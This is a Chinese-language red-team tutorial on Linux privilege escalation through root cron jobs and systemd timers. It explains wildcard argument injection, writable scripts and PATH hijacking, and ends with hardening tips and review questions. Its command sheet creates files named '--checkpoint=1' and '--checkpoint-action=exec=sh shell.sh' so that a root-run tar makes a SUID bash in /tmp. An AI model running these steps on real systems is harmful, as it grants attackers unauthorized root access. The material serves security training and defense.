# R18.5 Linux 排程任務 Crontab 與 Systemd 定時器萬用字元提權 (Crontab & Timer Abuse)

---

## 🎯 作戰任務破題 (Tactical Objective & Mental Workflow)

**Linux 排程任務 Crontab 與 Systemd 定時器萬用字元提權** 的物理本質為**利用 Linux 系統以最高特權 `root` 週期性自動執行的排程任務（`/etc/crontab`、`/etc/cron.*` 或 `systemd timers`），當其引用的腳本具備全域可寫權限 (World-Writable)、腳本內部調用了非絕對路徑二進位檔（PATH 劫持），或使用了萬用字元 `*` 傳遞給具備參數注入漏洞的命令（如 `tar *` 或 `rsync *`），攻擊者可藉由向目標目錄注入特定檔名將參數轉化為特權代碼執行**。在紅隊實戰中，排程任務是無互動環境下實現無聲垂直提權與權限維持的頂級向量。

```
[取得低特權 Linux 本機 Shell] ── 監控全系統定時任務與後台活動 (pspy 實時監聽)
                                      │
                                      ▼ 識別以 root (UID 0) 執行的週期性作業
┌─────────────────────────────────────┴─────────────────────────────────────────┐
│ 1. 檢查檔案權限: root 執行的腳本 /opt/backup.sh 是否對普通使用者具備可寫權限   │
│ 2. 檢查萬用字元注入: 腳本內是否包含 cd /var/www/html && tar -czf backup.tar *│
│ 3. 檢查 PATH 尋址: 腳本是否僅使用 cleanup.sh 而非絕對路徑 /usr/bin/cleanup.sh│
└─────────────────────────────────────┬─────────────────────────────────────────┘
                                      ▼
[情境 A: 腳本本身可寫] ───────────────┴─────► [情境 B: 存在萬用字元 tar * 注入]
          │                                                  │
          ▼ 直接在腳本末尾追加反彈 Shell 或 chmod u+s        ▼ 在目錄建立 --checkpoint 等特殊檔名
[等待排程定時器觸發執行] ◄────────────────────────────────────┘
```

## 🔬 第一動：Cron 調度引擎、Systemd Timer 與萬用字元解析物理機制 (Mechanics & Cron Internals)

### 1. Crontab 與 Systemd Timers 的權限邊界
- `/etc/crontab` 與 `/etc/cron.d/*` 中定義的系統級排程任務，預設執行身分均為 `root`。
- 現代 Linux 亦大量採用 `systemd.timer` 替代傳統 cron，其對應的 `.service` 檔案中定義的 `ExecStart=` 預設亦為 root 權限。

### 2. 萬用字元 `*` 展開的參數注入 (Wildcard Injection) 本質
當 Shell 執行 `tar -czf backup.tar *` 時，Shell 會在調用 `tar` 之前率先將 `*` 展開為當前目錄下的**所有檔案清單**：
- 若當前目錄下存在名為 `--checkpoint=1` 與 `--checkpoint-action=exec=sh evil.sh` 的檔案。
- Shell 展開後的真實執行命令變為：
  ```bash
  tar -czf backup.tar --checkpoint=1 --checkpoint-action=exec=sh evil.sh file1.txt file2.txt
  ```
- `tar` 直譯器會將這些檔案名稱當作**命列列參數 (Flags)** 解析，進而在解壓縮過程中調用 `sh evil.sh`，達成特權執行！

## ⚡ 第二動：戰術執行與工具鏈操作 (Attack Vectors & Exploitation)

### 1. 發現與監控隱蔽排程任務 (pspy)
很多內部任務不在 `/etc/crontab` 明文列出，使用 pspy 可在無 root 權限下監控 `D-Bus` 與 `/proc` 進程衍生事件：
```bash
# 下載並執行 pspy 監控進程創建與指令參數
./pspy64 -pf -i 1000
```

### 2. 萬用字元注入武器化指令操作表
```bash
# 1. 進入目標定期備份的目錄 (如 /var/www/html)
cd /var/www/html

# 2. 創建特權反彈或權限提升腳本
echo "cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash" > /var/www/html/shell.sh
chmod +x /var/www/html/shell.sh

# 3. 創建觸發 tar 檢查點特權執行的特殊參數檔名
touch "/var/www/html/--checkpoint=1"
touch '/var/www/html/--checkpoint-action=exec=sh shell.sh'

# 4. 等待排程分鐘級定時觸發後，檢驗 SUID 特權 Shell
/tmp/rootbash -p
```

## 🛡️ 第五動：工程級防禦基線 (Hardening Baselines)

1. **全面杜絕排程腳本中使用萬用字元 `*`**：
   - 在撰寫定時壓縮或清理腳本時，一律使用完整檔案路徑或配合 `--` 終止參數解析（如 `tar -czf backup.tar -- *`），防止檔名被解析為命令選項。
2. **鎖定排程與腳本目錄權限**：
   - 確保所有排程執行的二進位與腳本權限設為 `755` 且擁有者為 `root:root`，嚴禁設置任何群組或其他使用者可寫權限。

## 🎯 作戰驗收檢查點 (Operational Checkpoints)

- [ ] **Q1：Shell 在執行包含萬用字元 `*` 的命令時，其底層解析時序是什麼？**
  - **戰術思維**：Shell 在啟動目標程式前，會先在當前目錄將 `*` 展開為所有檔案名稱，並將其當作參數直接傳遞給二進位程式的 `argv` 陣列。
- [ ] **Q2：除了 `tar` 之外，Linux 中還有哪些常用工具存在萬用字元注入提權風險？**
  - **戰術思維**：`rsync`（支援 `-e` 參數指定任意 Shell 腳本）、`chown` / `chmod`（支援 `--reference` 拷貝特權屬性）。
- [ ] **Q3：在無權限查看 `/etc/cron*` 檔案的情境下，紅隊如何發現後台定期執行的排程？**
  - **戰術思維**：使用 `pspy` 工具監控 Linux 核心進程建立事件，透過實時觀察 UID 0 週期性衍生的短暫進程與其執行參數。
- [ ] **Q4：若排程腳本路徑為相對路徑（如 `backup.sh`），紅隊應如何利用？**
  - **戰術思維**：實施 PATH 環境變數劫持；若 Cron 檔案中定義了可寫目錄（如 `/tmp`）位於 PATH 前列，直接在該目錄下建立同名惡意腳本搶先被解析執行。
- [ ] **Q5：藍隊應如何防範排程任務引發的本地特權提升漏洞？**
  - **戰術思維**：排程命令強制使用絕對路徑、參數前加上 `--` 終止選項解析、嚴格審計腳本權限為 root 專屬可讀寫。
